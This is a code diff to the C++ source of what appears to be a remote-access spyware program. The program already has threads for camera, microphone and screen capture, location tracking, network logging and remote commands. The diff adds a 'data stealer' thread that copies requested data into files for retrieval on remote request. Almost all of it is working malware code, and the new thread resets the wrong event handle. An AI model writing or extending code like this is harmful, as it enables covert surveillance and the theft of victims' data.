@@ -1,7 +1,7 @@
 #include "TaskRoutines.h"
 #include "TasksHelper.h"
 
-HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
+HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, stealRequest, screenRequest, newDataEvent;
 map<string, map<string, string>> workingTasks;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
@@ -71,7 +71,7 @@ DWORD WINAPI initNetLogger(LPVOID lpParam)
 		// Sort lines of last file and remove duplicates  
 		wstring rDuplicates = L"powershell -command \"Get-Content " + secondFilename + L" | Sort-Object -Unique | Get-Unique\"";
 		runCommand(rDuplicates.c_str(), firstfilename.c_str());
-		
+
 		// Delete the old file
 		DeleteFile(secondFilename.c_str());
 
@@ -225,8 +225,8 @@ DWORD WINAPI initRemoteCommands(LPVOID lpParam)
 			cmdRequest, // event handle
 			INFINITE);    // indefinite wait
 		ResetEvent(cmdRequest);
-		//		 Request Arrived..
-					// Try to find the task in the workingTasks list
+		// Request Arrived..
+		// Try to find the task in the workingTasks list
 		map<string, map<string, string>>::iterator tasksIter = workingTasks.find(Command);
 
 		if (tasksIter == workingTasks.end()) // Sanity check
@@ -278,6 +278,35 @@ DWORD WINAPI initLocationTracker(LPVOID lpParam) {
 		{
 			SetEvent(newDataEvent);
 		}
+	}
+	return 0;
+}
+
+DWORD WINAPI initDataStealer(LPVOID lpParam)
+{
+	do {
+		stealRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("steal"));
+	} while (stealRequest == NULL);
+	while (TRUE)
+	{
+		WaitForSingleObject(
+			stealRequest, // event handle
+			INFINITE);    // indefinite wait
+		ResetEvent(newDataEvent);
+
+		// Try to find the task in the workingTasks list
+		map<string, map<string, string>>::iterator tasksIter = workingTasks.find(DataGrab);
+
+		if (tasksIter == workingTasks.end()) // Sanity check
+			continue; // Task not found in the list
+		map<string, string>::iterator commandIter = (tasksIter->second).find("type");
+		if (commandIter == (tasksIter->second).end()) // Sanity check
+			continue;
+
+		string dataToCopy = commandIter->second;
+		wstring filename = stringToWString(constructFilename(DATA_GRAB_CODE));
+		if (grabData(dataToCopy.c_str(), filename.c_str()))
+			SetEvent(newDataEvent);
 	}
 	return 0;
 }
@@ -378,6 +407,8 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 			initRequest(allRequests, Lockdown, lockRequest);
 			initRequest(allRequests, Command, cmdRequest);
 			initRequest(allRequests, Location, locationRequest);
+			initRequest(allRequests, DataGrab, stealRequest);
+
 		}
 		Sleep(SYNC_TIME);
 	}
